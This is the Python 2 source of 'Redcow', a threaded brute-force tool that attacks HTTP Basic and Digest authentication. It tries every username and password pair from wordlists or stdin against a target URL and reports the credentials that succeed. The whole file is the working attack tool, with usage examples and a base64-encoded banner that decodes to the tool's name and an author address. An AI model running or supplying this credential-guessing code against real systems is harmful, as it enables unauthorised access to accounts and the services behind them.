#!/usr/bin/env python2

import requests
import argparse
import os.path
import select
import base64
import ssl
import sys
import re

from Queue import Queue
from requests.auth import HTTPDigestAuth
from threading import Thread
from time import sleep

#
#
#

class Redcow(object):

    def __init__(self, url, userlist, passlist, workers, stdin_flag, verbose_flag):
        self.url = url
        self.userlist = userlist
        self.passlist = passlist
        self.workers = workers
        self.s_flag = stdin_flag
        self.v_flag = verbose_flag
        self.credentials = Queue(maxsize=0)
        self._realm = ''
        self._schema = ''

        #get it in!
        self.__check_target(self.url)
        self.__parse_credentials()

    def __parse_credentials(self):
        _users = list()
        _passwords = list()

        if self.userlist:
            self.__write('[?] Parsing Userlist...', True)
            if os.path.isfile(self.userlist):
                for user in open(self.userlist):
                    _users.append(user.rstrip())
            else:
                _users.append(self.userlist)
            sleep(0.5)
            self.__write('[*] Parsing Userlist... \033[92mDONE\n', True)

        if self.passlist:
            self.__write('[?] Parsing Passlist...', True)
            if os.path.isfile(self.passlist):
                for passwd in open(self.passlist):
                    _passwords.append(passwd.rstrip())
            else:
                _passwords.append(self.passlist)
            sleep(0.5)
            self.__write('[*] Parsing Passlist... \033[92mDONE\n', True)

        if self.s_flag:
            self.__write('[?] Parsing STDIN Input...', True)
            if select.select([sys.stdin, ], [], [], 0.0)[0]:
                for line in sys.stdin:
                    for x in line.split():
                        _passwords.append(x.rstrip())
            sleep(0.5)
            self.__write('[*] Parsing STDIN Input... \033[92mDONE\n', True)

        self.__write('[?] Loading credentials into Queue...', True)
        for _user in _users:
            for _pass in _passwords:
                _cred = dict(username=_user, password=_pass)
                self.credentials.put(_cred)
        sleep(0.5)
        self.__write('[*] Loading credentials into Queue... \033[92mDONE\n', True)

    def __check_target(self, url=''):
        if self.url:
            #self.__motd()
            self.__write('\n[?] Checking URL for valid response...', True)
            try:
                r = requests.get(url)
            except requests.exceptions.ConnectionError as e:
                self.__write('[x] Checking URL for valid response... \033[91mFAIL\n', True)

                if str(e.args[0].reason).split(':')[2]:
                    self.__write('\t[!] Error - %s' % str(e.args[0].reason).split(':')[2])
                else:
                    self.__write('\t[!] Error - %s' % str(e.message))
                sys.exit(1)

            if r.status_code != 401:
                self.__write('[x] Checking URL for valid response... \033[91mFAIL\n', True)
                self.__write('\t[!] Error - URL provided does not reply with 401 reponse code. Exiting.')
                sys.exit(1)
            else:
                auth_header = r.headers['www-authenticate']
                pattern = re.compile(r'''(?:\s*www-authenticate\s*:)?\s*(\w*)\s+realm=['"]([^'"]+)['"]''', re.IGNORECASE)
                auth_group = pattern.match(auth_header)
                self._schema = auth_group.group(1).lower()
                self._realm = auth_group.group(2).lower()

                if self._realm:
                    self.__write('[*] Checking URL for valid response... \033[92mDONE\n', True)
                    print "\n\t[!] HTTP Authentication Realm:  '%s'" % (self._realm.capitalize())
                    print "\t[!] HTTP Authentication Schema: '%s'\n" % (self._schema.capitalize())
                    return

    def breach(self):
        while True:
            while self.credentials.empty() is not True:
                _cred = self.credentials.get()
                self.__write('[!] Attempting breach using credentials [User] %15s \t[Pass] %15s' % (_cred['username'], _cred['password']), True)
                try:
                    if self._schema == 'basic':
                        r = requests.post(self.url, auth=(_cred['username'], _cred['password']))
                    elif self._schema == 'digest':
                        r = requests.post(self.url, auth=HTTPDigestAuth(_cred['username'], _cred['password']))
                    else:
                        r = requests.post(self.url, auth=(_cred['username'], _cred['password']))
                except requests.exceptions.ConnectionError as e:
                    if str(e.args[0].reason).split(':')[2]:
                        self.__write('\t[!] Error - %s' % str(e.args[0].reason).split(':')[2])
                    else:
                        self.__write('\t[!] Error - %s' % str(e.message))
                    del _cred
                    self.credentials.task_done()
                    sys.exit(1)

                if r.status_code == 200:
                    print "\n'%s' Authentication BREACH3D!\n\t[USER] %15s\n\t[PASS] %15s\n" % (self._schema, _cred['username'], _cred['password'])
                    print "\nWaiting for threads to finish..."
                    #save_stdout = sys.stdout
                    #sys.stdout = open('trash', 'w')
                    del _cred
                    self.credentials.task_done()
                    break

                    #sys.exit(0)
            else:
                sleep(0.25)
                #break/return didnt work

    def __motd(self):
        data00 = "G1s5Mm0NCg0KICBfICAgICAgXyAgICAgICAgIF8gICAgICAgICAgICAgICAgICBfICAgICAgICAgXyAgICAgICAgICAgIF8gICAgICAgICAgICAgXyAgICAgIA0KL18vXCAgICAvXCBcICAgICAvIC9cICAgICAgICAgICAgICAgIC9cIFwgICAgICAvIC9cICAgICAgICAgL1wgXCAgICAgICAgIC9cIFwgICAgIA0KXCBcIFwgICBcIFxfXCAgIC8gLyAgXCAgICAgICAgICAgICAgLyAgXCBcICAgIC8gLyAgXCAgICAgICAvICBcIFwgICAgICAgLyAgXCBcICAgIA0KIFwgXCBcX18vIC8gLyAgLyAvIC9cIFwgICAgICAgICAgICAvIC9cIFwgXCAgLyAvIC9cIFxfXyAgIC8gL1wgXCBcICAgICAvIC9cIFwgXCAgIA0KICBcIFxfXyBcL18vICAvIC8gL1wgXCBcICAgICAgICAgIC8gLyAvXCBcX1wvIC8gL1wgXF9fX1wgLyAvIC9cIFxfXCAgIC8gLyAvXCBcIFwgIA0KICAgXC9fL1xfXy9cIC9fLyAvICBcIFwgXCAgICAgICAgLyAvXy9fIFwvXy9cIFwgXCBcL19fXy8vIC9fL18gXC9fLyAgLyAvIC8gIFwgXF9cIA0KICAgIF8vXC9fX1wgXFwgXCBcICAgXCBcIFwgICAgICAvIC9fX19fL1wgICAgXCBcIFwgICAgIC8gL19fX18vXCAgICAvIC8gLyAgICBcL18vIA0KICAgLyBfL18vXCBcIFxcIFwgXCAgIFwgXCBcICAgIC8gL1xfX19fXC9fICAgIFwgXCBcICAgLyAvXF9fX19cLyAgIC8gLyAvICAgICAgICAgIA0KICAvIC8gLyAgIFwgXCBcXCBcIFxfX19cIFwgXCAgLyAvIC8gICAgIC9fL1xfXy8gLyAvICAvIC8gL19fX19fXyAgLyAvIC9fX19fX19fXyAgIA0KIC8gLyAvICAgIC9fLyAvIFwgXC9fX19fXCBcIFwvIC8gLyAgICAgIFwgXC9fX18vIC8gIC8gLyAvX19fX19fX1wvIC8gL19fX19fX19fX1wgIA0KIFwvXy8gICAgIFxfXC8gICBcX19fX19fX19fXC9cL18vICAgICAgICBcX19fX19cLyAgIFwvX19fX19fX19fXy9cL19fX19fX19fX19fXy8gIA0KDQobWzBtDQobWzkxbSAgICAgICAgICAgICAgICAgW1JFRENPVzogaHR0cCBhdXRoZW50aWNhdGlvbiBicnV0ZWZvcmNlIHRvb2xdDQobWzBtDQogICAgICAgICAgICAgICAgICAgICAgIGJ5OiAweDY0NjQ1ZkBwcm90b25tYWlsLmNvbQ0KDQo="
        print(base64.b64decode(data00))

    def __write(self, msg, inplace=False):
        if msg and inplace is not True:
            print "\n\033[1m%s\033[0m\n" % (str(msg))
        elif msg and inplace is True:
            sys.stdout.write('\033[1m%s\033[0m\r' % msg)
            sys.stdout.flush()
        else:
            return

def Usage():
    print "\n\033[1mUSAGE\033[0m:"
    print "  %s -t http://target.tld/ -u admin -p /path/to/dict.txt" % (sys.argv[0])
    print "  %s -t http://target.tld/ -u admin -p /path/to/dict.txt --workers 10" % (sys.argv[0])
    print "  %s -t http://target.tld/ -u /path/to/users.txt -p /path/to/dict.txt --workers 10" % (sys.argv[0])
    print "  %s -t http://target.tld/ -u /path/to/users.txt -p /path/to/dict.txt --workers 10 -s" % (sys.argv[0])
    print "  %s -t http://target.tld/ -u /path/to/users.txt -p /path/to/dict.txt --workers 10 -s -v" % (sys.argv[0])
    print "\n\033[1mOPTIONS\033[0m:"
    print "  '-t', '--target'    - The URL containing http_auth scheme to bruteforce"
    print "  '-u', '--users'     - A username or file containing usernames to attempt"
    print "  '-p', '--passwords' - A password or file containing passworsd to attempt"
    print "  '-w', '--workers'   - The number of threads to use during attempt"
    print "  '-s', '--stdin'     - Boolean flag for allowing STDIN input"
    print "  '-v', '--verbose'   - Print out verbose output. [Experimental]    "
    print "\n\033[1mNOTES\033[0m:"
    print "  Either the (-s) or (-p) option must be used in command.\n"

def Error(msg='Undefined Error'):
    print "\n\033[1m%s\033[0m" % str(msg)
    Usage()
    sys.exit(1)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help=False, usage=Usage)

    parser.add_argument('-t', '--target',    action='store', dest='t', default='')
    parser.add_argument('-u', '--users',     action='store', dest='u', default='')
    parser.add_argument('-p', '--passwords', action='store', dest='p', default='')
    parser.add_argument('-w', '--workers',   action='store', dest='w', default=1)
    parser.add_argument('-s', '--stdin',     action='store_true', dest='s_flag', default=False)
    parser.add_argument('-v', '--verbose',   action='store_true', dest='v_flag', default=False)
    parser.add_argument('-h', '--help',      action='store_true', dest='h_flag', default=False)

    try:
        args = parser.parse_args()
    except TypeError:
        Error("The options you provided were not supplied correctly. Please take another look at the examples.")

    if args.h_flag:
        Usage()
        sys.exit(1)
    elif not args.u or not args.t:
        Error("The options (-u) and (-t) are mandatory, and must be set.")
    elif not args.p and not args.s_flag:
        Error("The options (-p) and/or (-s) are mandatory, and must be set.")

    MoOo = Redcow(args.t, args.u, args.p, args.w, args.s_flag, args.v_flag)
    for x in xrange(int(args.w)):
        thread = Thread(target=MoOo.breach)
        thread.setDaemon(True)
        thread.start()

    MoOo.credentials.join()
    sys.exit(0)
